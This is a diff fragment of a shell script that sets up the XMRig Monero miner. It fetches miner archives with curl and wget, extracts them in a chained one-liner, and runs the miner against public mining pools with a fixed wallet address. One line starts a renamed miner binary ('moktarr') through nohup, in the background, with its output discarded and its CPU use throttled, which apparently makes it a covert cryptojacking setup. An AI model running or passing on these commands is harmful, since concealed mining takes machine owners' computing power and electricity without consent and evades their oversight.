@@ -16,9 +16,12 @@ xmrig --url eu.hashvault.pro:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8Q
 xmrig --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 -t 1 --yield 
 nohup ./moktarr --url mine.c3pool.com:443 --user 88kM3JHo81q7apAz5NYSGEizUq5YRDKEmDGBVB8QkFAk7swZjVYNiCnDpDtqkeWtSWNJ3S2rbNrZXeAwtFjZjHNWKjGDKU2 --pass tzao --donate-level 0 --coin monero -B --randomx-mode=fast --cpu-priority=3 -t 1 > /dev/null 2>&1 &
 
-curl -L -o xmrig-6.25.0.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-jammy-x64.tar.gz
+
+# DOWNLOAD THE MINER BINARY & EXTRACT
 
 curl -L -o xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz
+
+wget -O xmrig.tar.gz https://github.com/C3Pool/xmrig-C3/releases/download/v6.24.0-C3/xmrig-v6.24.0-C3-linux-Static.tar.gz && tar -xzf xmrig.tar.gz && rm -f xmrig.tar.gz
 
 
 # STEP 1 file
